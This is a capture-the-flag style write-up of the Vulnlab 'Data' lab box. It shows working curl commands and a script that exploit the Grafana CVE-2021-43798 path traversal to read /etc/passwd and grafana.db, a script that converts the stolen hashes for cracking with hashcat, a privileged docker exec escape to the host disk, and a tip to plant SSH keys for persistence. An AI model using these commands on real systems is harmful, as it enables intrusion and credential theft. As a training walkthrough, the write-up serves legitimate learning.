---
heroImage: '../../../assets/posts/vulnlab-data/data.png'
layout: post
description: Easy linux box with LFI dumping grafana.db, password cracking, and sudo docker abuse for a host escape.
postType: VULNLAB
osType: Linux
pubDate:  2025-09-28
difficulty: Easy
title: "Data"
date: Sun Sep 28 08:46:31 PM HST 2025
image:
    path: ../../../assets/posts/vulnlab-data/data.png
    alt: [Vulnlab - Data]
# List Format
table_of_contents:
    - Overview
    - Enumeration
    - Initial Foothold
    - Privilege Escalation
    - Remediation
initial_creds: ""
# List Format
ip_addresses: 
    - 10.10.11.68
---


# Overview

Data is an easy linux box with only two open ports. We have SSH and a Grafana instance on port 3000. It runs on an old version of grafana, version 8.0 which is susceptible to unauthorized LFI. Which we can leverage to get a database file which contains users and their hashes. We can dump that, crack one for a user named boris. This gets our foot hold and boris has sudo privileges for `docker exec *`  as root. We can find the container through some proc tricks, get a shell with `--privileged` and mount the root filesystem as a classic docker breakout.



## Enumeration

Typical start with an nmap scan
```
# Nmap 7.97 scan initiated Sun Sep 28 15:02:02 2025 as: nmap -vv -sCV -oA nmap/data -Pn -T4 --min-rate 1000 -p- 10.129.110.95
Warning: 10.129.110.95 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.110.95
Host is up, received user-set (0.13s latency).
Scanned at 2025-09-28 15:02:03 HST for 103s
Not shown: 63998 closed tcp ports (conn-refused), 1535 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzybAIIzY81HLoecDz49RqTD3AAysgQcxH3XoCwJreIo17nJDB1gdyHYQERGigDVgG9hz9uB4AzJc87WXGi7TUM0r16XTLwtEX7MoMgmsXKJX/EoZGQsb1zyFnwQR00xsX2mDvHpaDeUh3EtsL1zAgxLSgi/uym4nLwjTHqpTmm0shwDqlpOvKBbL7IcQ3vVKkmy7o7TG7HYMHiDYF+Aw5BKnOTuVoMgGy3gaFXJqyhszV/6BD9UQALdrtAXKO3bO4D6g5gM9N78Om7kwRvEW3NDwvk5w+gA6wDFpMAigccCaP/JuEPoeqgV3r6cL4PovbbZkxQScY+9SuOGb78EjR
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGUqvSE3W1c40BBItjgG3RCCbsMNpcqRV0DbxMh3qruh0nsNdNm9QuTflzkzqj0nxPoAmjUqq0SolF0UFHqtmEc=
|   256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPDOwcGGuUmX8fQkvfAdnPuw9tMrPSs4nai8+KMFzpvf
3000/tcp open  http    syn-ack Grafana http
|_http-favicon: Unknown favicon MD5: C308E3090C62A6425B30B4C38883196B
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 28 15:03:46 2025 -- 1 IP address (1 host up) scanned in 103.73 seconds
```

The OpenSSH version is a little dated by today's standards but nothing crazy. So we'll focus on port 3000 because it's a webserver of some kind.

![grafana](../../../assets/posts/vulnlab-data/grafana.png)

We can some default credentials, but there's nothing that let's us in. However there's a piece of information that is graciously leaked here and that version is 8.0.0

Some minimal research (searching Grafana v8 cve) leads us to this wonderful implementation of `CVE-2021-43798`

[Grafana Exploit](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)

It targets some typical things you'd want out of a grafana instance which is ideal. It automates all the things you'd want. The CVE exposes an unauthorized LFI by looking through publicly facing plugins. 

All the script is doing is going through some commonly known plugins to find one that's available and then enumerate some common desireable files.

You can easily replicate this with a simple curl command.

```bash
curl -s --path-as-is 'http://10.129.110.95:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
```
```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin

```

And to replicate the script.
```bash
file_paths=("/etc/passwd" "/etc/grafana/grafana.ini" "/var/lib/grafana/grafana.db")
for f in ${file_paths[@]}; do
    new_file=$(awk -F '/' '{print $NF}' <<< "$f")
    curl -s --path-as-is "http://10.129.110.95:3000/public/plugins/alertlist/../../../../../../../..${f}" > ${new_file}
done
```

This reproduces the same output, without doing all the testing and such first. But the cve is quite simple. The main goodness of it is it specifically does a bit of recon that is helpful, the location of the grafana db. Because that would be the only super useful thing we can grab. As the lack of user accounts from the /etc/passwd that we read suggests we're on a container. 

You would typically see `user:1000:1000:description here:/home/user:/bin/bash`
There is no user in the typical range of 1000+, sub 1000  are usually service-like accounts.

Run the script, either the one I just cooked up or the python one and open up the database with sqlite.

```

sqlite> .tables
alert                       login_attempt
alert_configuration         migration_log
alert_instance              org
alert_notification          org_user
alert_notification_state    playlist
alert_rule                  playlist_item
alert_rule_tag              plugin_setting
alert_rule_version          preferences
annotation                  quota
annotation_tag              server_lock
api_key                     session
cache_data                  short_url
dashboard                   star
dashboard_acl               tag
dashboard_provisioning      team
dashboard_snapshot          team_member
dashboard_tag               temp_user
dashboard_version           test_data
data_source                 user
library_element             user_auth
library_element_connection  user_auth_token

sqlite> .schema user
CREATE TABLE `user` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `version` INTEGER NOT NULL
, `login` TEXT NOT NULL
, `email` TEXT NOT NULL
, `name` TEXT NULL
, `password` TEXT NULL
, `salt` TEXT NULL
, `rands` TEXT NULL
, `company` TEXT NULL
, `org_id` INTEGER NOT NULL
, `is_admin` INTEGER NOT NULL
, `email_verified` INTEGER NULL
, `theme` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);
CREATE UNIQUE INDEX `UQE_user_login` ON `user` (`login`);
CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
CREATE INDEX `IDX_user_login_email` ON `user` (`login`,`email`);


sqlite> select email,name,salt,password from user;
admin@localhost||YObSoLj55S|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8
boris@data.vl|boris|LCBhdtJWjl|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8
```

We have two user accounts with some passwords and their salt.

We need to crack them but the format it's in is unrecognizable to john or hashcat. In fact, we don't even know what format it should be in.

This is when you have to typically look at the source code. We can clone the specific tagged version so we can inspect it.

```bash
git clone --single-branch --branch v8.0.0 https://github.com/grafana/grafana.git
cd grafana
```

Now grafana is rather large, so we have to have some idea of what the hash might be. The length is rather unique. It's 100 characters so it would be 50 bytes natively. There's not a hashing function that is innately 50 bytes long. So this should be in a parameter somewhere.

And it's built with go, so it should use some aspect of the crypto library, likely to build this.

So a clever way to find it based on what we know...

```bash
grep -Rl 'crypto/' | xargs grep -P '\(.*50.*\)'
```
```

pkg/api/http_server.go:         ctx.Resp.WriteHeader(503)
pkg/middleware/csp.go:                  logger.Debug("CSP template not configured, so returning 500")
pkg/middleware/csp.go:                  ctx.JsonApiErr(500, "CSP template has to be configured", nil)
pkg/middleware/csp.go:                  ctx.JsonApiErr(500, "Failed to generate CSP nonce", err)
pkg/services/notifications/codes.go:            before, _ := time.ParseInLocation("200601021504", start, time.Local)
pkg/util/encoding.go:   newPasswd := pbkdf2.Key([]byte(password), []byte(salt), 10000, 50, sha256.New)
```


And it looks like we have a reasonable hit in the `encoding.go` 

We can see the entire function and what `Key()` is doing.
```go
// EncodePassword encodes a password using PBKDF2.
func EncodePassword(password string, salt string) (string, error) {
	newPasswd := pbkdf2.Key([]byte(password), []byte(salt), 10000, 50, sha256.New)
	return hex.EncodeToString(newPasswd), nil
}
// pbkdf2.go

func Key(password, salt []byte, iter, keyLen int, h func() hash.Hash) []byte {
	prf := hmac.New(h, password)
	hashLen := prf.Size()
	numBlocks := (keyLen + hashLen - 1) / hashLen

	var buf [4]byte
	dk := make([]byte, 0, numBlocks*hashLen)
	U := make([]byte, hashLen)
	for block := 1; block <= numBlocks; block++ {
		// N.B.: || means concatenation, ^ means XOR
		// for each block T_i = U_1 ^ U_2 ^ ... ^ U_iter
		// U_1 = PRF(password, salt || uint(i))
		prf.Reset()
		prf.Write(salt)
		buf[0] = byte(block >> 24)
		buf[1] = byte(block >> 16)
		buf[2] = byte(block >> 8)
		buf[3] = byte(block)
		prf.Write(buf[:4])
		dk = prf.Sum(dk)
		T := dk[len(dk)-hashLen:]
		copy(U, T)

		// U_n = PRF(password, U_(n-1))
		for n := 2; n <= iter; n++ {
			prf.Reset()
			prf.Write(U)
			U = U[:0]
			U = prf.Sum(U)
			for x := range U {
				T[x] ^= U[x]
			}
		}
	}
	return dk[:keyLen]
}


```

It's using  pbkdf2 with sha256, and the pbkdf2 internally uses hmac. 
So we have pbkdf2-hmac-sha256

Let's look this up.

```bash
# Hashcat -H gives all the hashes and descriptions
hashcat -H | grep -i 'pbkdf2.*hmac.*sha256.*'
```

```
  Name................: PBKDF2-HMAC-SHA256
  Name................: RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)
  Name................: MS-AzureSync PBKDF2-HMAC-SHA256
  Name................: Ethereum Wallet, PBKDF2-HMAC-SHA256
  Name................: Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256
  Name................: PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)
  Name................: VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)
  Name................: VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)
  Name................: NetIQ SSPR (PBKDF2WithHmacSHA256)
  Name................: Microsoft Online Account (PBKDF2-HMAC-SHA256 + AES256)
  Name................: Citrix NetScaler (PBKDF2-HMAC-SHA256)
```

We'll choose the most generic one, since grafana is none of the others.


```bash
# Search before to get the hash mode and after to get the example hash
hashcat -H | grep -B +1 -A +15 ': PBKDF2-HMAC-SHA256$'
```
```
Hash mode #10900
  Name................: PBKDF2-HMAC-SHA256
  Category............: Generic KDF
  Slow.Hash...........: Yes
  Deprecated..........: No
  Deprecated.Notice...: N/A
  Password.Type.......: plain
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure
  Example.Hash.Format.: plain
  Example.Hash........: sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk
  Example.Pass........: hashcat
  Benchmark.Mask......: ?a?a?a?a?a?a?a
```


So that's how our hash is supposed to look.

It looks like `sha256:iterations:salt:hash`

And it's base64 encoded, rather than hexed. So we can make a simple script to do just that.

```bash
#!/usr/bin/env bash

delim='|'

while IFS=$delim read -r salt pw; do
   salt_enc=$(base64 -w 0 <<< "$salt")
   hash_enc=$(xxd -r -ps <<<  "$pw" | base64 -w0)
   echo "sha256:10000:$salt_enc:$hash_enc"
done
```

```bash
sqlite3 grafana.db 'select salt,password from user;' | ./graf2hashcat.sh
```
```
sha256:10000:WU9iU29MajU1Uwo=:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbAo=:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
```

Now of course, if you just searched for [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat/tree/main) on github, you'd have found this work has already been done. 

However, it's nice to get an idea of how to actually do research and think of techniques that would help you figure this out if the work wasn't done. Because eventually you'll encounter situations where it isn't.


So we try and crack these hashes
```bash
hashcat hashes /seclists/rockyou.txt -m 10900
```

This will give us a password for the user boris. You could login to the grafana instance if you like, but I immediately tried for password reuse, seeing it if it works the SSH. And it does.


## PrivEsc


Once we have boris, we do the typical check of a `sudo -l`

```bash
#boris@data:~$
sudo -l
```

```
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *

```

docker exec lets us execute commands on a container, which likely is the grafana container, but we'd need to know the container id. But we can't use `docker ps` becuase we don't have those permissions. So how do we find the container id?

We actually have a few ways, the easiest would probably be looking at the processes that have docker in them and hoping we see a cmdline entry that shows it.

```bash
ps aux | grep docker
```
```
root      1018  0.2  4.0 1496232 81524 ?       Ssl  02:58   0:03 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1219  0.2  2.1 1277324 44312 ?       Ssl  02:59   0:03 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1527  0.0  0.1 1226188 3220 ?        Sl   02:59   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1532  0.0  0.1 1153864 3316 ?        Sl   02:59   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1550  0.0  0.4 712864  8520 ?        Sl   02:59   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1570  0.1  3.0 775624 61360 ?        Ssl  02:59   0:02 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
boris     5853  0.0  0.0  14860  1072 pts/0    S+   03:23   0:00 grep --color=auto docker

```


We can see the id there, so that's great, but what are some other ways to find it?

```bash
grep -iRs 'docker' /proc/*/cgroup
```
```
/proc/1018/cgroup:11:freezer:/snap.docker
/proc/1018/cgroup:10:devices:/system.slice/snap.docker.dockerd.service
/proc/1018/cgroup:5:blkio:/system.slice/snap.docker.dockerd.service
/proc/1018/cgroup:4:pids:/system.slice/snap.docker.dockerd.service
/proc/1018/cgroup:3:cpu,cpuacct:/system.slice/snap.docker.dockerd.service
/proc/1018/cgroup:2:memory:/system.slice/snap.docker.dockerd.service
/proc/1018/cgroup:1:name=systemd:/system.slice/snap.docker.dockerd.service
/proc/1018/cgroup:0::/system.slice/snap.docker.dockerd.service
/proc/1219/cgroup:11:freezer:/snap.docker
/proc/1219/cgroup:10:devices:/system.slice/snap.docker.dockerd.service
/proc/1219/cgroup:5:blkio:/system.slice/snap.docker.dockerd.service
/proc/1219/cgroup:4:pids:/system.slice/snap.docker.dockerd.service
/proc/1219/cgroup:3:cpu,cpuacct:/system.slice/snap.docker.dockerd.service
/proc/1219/cgroup:2:memory:/system.slice/snap.docker.dockerd.service
/proc/1219/cgroup:1:name=systemd:/system.slice/snap.docker.dockerd.service
/proc/1219/cgroup:0::/system.slice/snap.docker.dockerd.service
/proc/1527/cgroup:11:freezer:/snap.docker
/proc/1527/cgroup:10:devices:/system.slice/snap.docker.dockerd.service
/proc/1527/cgroup:5:blkio:/system.slice/snap.docker.dockerd.service
/proc/1527/cgroup:4:pids:/system.slice/snap.docker.dockerd.service
/proc/1527/cgroup:3:cpu,cpuacct:/system.slice/snap.docker.dockerd.service
/proc/1527/cgroup:2:memory:/system.slice/snap.docker.dockerd.service
/proc/1527/cgroup:1:name=systemd:/system.slice/snap.docker.dockerd.service
/proc/1527/cgroup:0::/system.slice/snap.docker.dockerd.service
/proc/1532/cgroup:11:freezer:/snap.docker
/proc/1532/cgroup:10:devices:/system.slice/snap.docker.dockerd.service
/proc/1532/cgroup:5:blkio:/system.slice/snap.docker.dockerd.service
/proc/1532/cgroup:4:pids:/system.slice/snap.docker.dockerd.service
/proc/1532/cgroup:3:cpu,cpuacct:/system.slice/snap.docker.dockerd.service
/proc/1532/cgroup:2:memory:/system.slice/snap.docker.dockerd.service
/proc/1532/cgroup:1:name=systemd:/system.slice/snap.docker.dockerd.service
/proc/1532/cgroup:0::/system.slice/snap.docker.dockerd.service
/proc/1550/cgroup:11:freezer:/snap.docker
/proc/1550/cgroup:10:devices:/system.slice/snap.docker.dockerd.service
/proc/1550/cgroup:5:blkio:/system.slice/snap.docker.dockerd.service
/proc/1550/cgroup:4:pids:/system.slice/snap.docker.dockerd.service
/proc/1550/cgroup:3:cpu,cpuacct:/system.slice/snap.docker.dockerd.service
/proc/1550/cgroup:2:memory:/system.slice/snap.docker.dockerd.service
/proc/1550/cgroup:1:name=systemd:/system.slice/snap.docker.dockerd.service
/proc/1550/cgroup:0::/system.slice/snap.docker.dockerd.service
/proc/1570/cgroup:12:perf_event:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:11:freezer:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:10:devices:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:9:hugetlb:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:7:cpuset:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:6:net_cls,net_prio:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:5:blkio:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:4:pids:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:3:cpu,cpuacct:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:2:memory:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:1:name=systemd:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
/proc/1570/cgroup:0::/system.slice/snap.docker.dockerd.service
```


Why does this work?
Containers in linux are simply: namespaces + cgroups
What we're seeing is the control group being mapped for the process.
`id:controller:cgroup-path`

It's actually located in the `sys/fs`

```
boris@data:/proc/1570$ ls /sys/fs/
aufs  bpf  btrfs  cgroup  ecryptfs  ext4  fuse  pstore
```


When you see docker/<container id> it's referencing something actually on the file system

```
boris@data:/proc/1570$ ls /sys/fs/cgroup/memory/docker
cgroup.clone_children                                             memory.kmem.usage_in_bytes
cgroup.event_control                                              memory.limit_in_bytes
cgroup.procs                                                      memory.max_usage_in_bytes
e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81  memory.move_charge_at_immigrate
memory.failcnt                                                    memory.numa_stat
memory.force_empty                                                memory.oom_control
memory.kmem.failcnt                                               memory.pressure_level
memory.kmem.limit_in_bytes                                        memory.soft_limit_in_bytes
memory.kmem.max_usage_in_bytes                                    memory.stat
memory.kmem.slabinfo                                              memory.swappiness
memory.kmem.tcp.failcnt                                           memory.usage_in_bytes
memory.kmem.tcp.limit_in_bytes                                    memory.use_hierarchy
memory.kmem.tcp.max_usage_in_bytes                                notify_on_release
memory.kmem.tcp.usage_in_bytes                                    tasks

```

And we can see the container. Luckily docker, just uses the whole container id to keep track of these things to map cgroups so we can get that information.



Now, we know the container and we can execute some commands, what does that get us?
Well, a little googling...

[Docker Escapes](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html)

[Docker --privileged](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-privileged.html)

```bash
sudo docker exec --help

Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]

Run a command in a running container

Options:
  -d, --detach               Detached mode: run command in the background
      --detach-keys string   Override the key sequence for detaching a container
  -e, --env list             Set environment variables
      --env-file list        Read in a file of environment variables
  -i, --interactive          Keep STDIN open even if not attached
      --privileged           Give extended privileges to the command
  -t, --tty                  Allocate a pseudo-TTY
  -u, --user string          Username or UID (format: <name|uid>[:<group|gid>])
  -w, --workdir string       Working directory inside the container

```

We have the `--privileged` option...

From the hacktricks privileged website:
```
Mount /dev

In a privileged container, all the devices can be accessed in /dev/. Therefore you can escape by mounting the disk of the host.
```


Seems simple.

```
boris@data:/proc/1570$ lsblk
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
loop0    7:0    0  42.2M  1 loop /snap/snapd/14066
loop1    7:1    0  55.5M  1 loop /snap/core18/2253
loop2    7:2    0 116.6M  1 loop /snap/docker/1125
loop3    7:3    0    25M  1 loop /snap/amazon-ssm-agent/4046
sda      8:0    0     6G  0 disk
├─sda1   8:1    0     5G  0 part /
└─sda2   8:2    0  1023M  0 part [SWAP]

```
The disk is sda1

Let's get a root shell and mount that with a privileged container.

```bash
# Utilizing -u 0 for the root user on the container
sudo docker exec --privileged -it -u 0 e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
```
```bash
bash-5.1# whoami
root
bash-5.1# ls /dev/sda1
/dev/sda1
bash-5.1# mkdir -p /mnt/the_root
bash-5.1# mount /dev/sda1 /mnt/the_root
bash-5.1# cd /mnt/the_root/root
bash-5.1# ls -la
```
```
total 36
drwx------    7 root     root          4096 Sep 30 02:59 .
drwxr-xr-x   23 root     root          4096 Jun  4 13:20 ..
lrwxrwxrwx    1 root     root             9 Jan 23  2022 .bash_history -> /dev/null
drwx------    2 root     root          4096 Apr  9 09:05 .cache
drwx------    3 root     root          4096 Apr  9 09:05 .gnupg
drwxr-xr-x    3 root     root          4096 Jan 23  2022 .local
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
drwx------    2 root     root          4096 Jan 23  2022 .ssh
-rw-r-----    1 root     root            33 Sep 30 02:59 root.txt
drwxr-xr-x    4 root     root          4096 Jan 23  2022 snap

```

And there we go. We have the root flag
And for persistence, you can easily stash a ssh key here or something and just come back in.





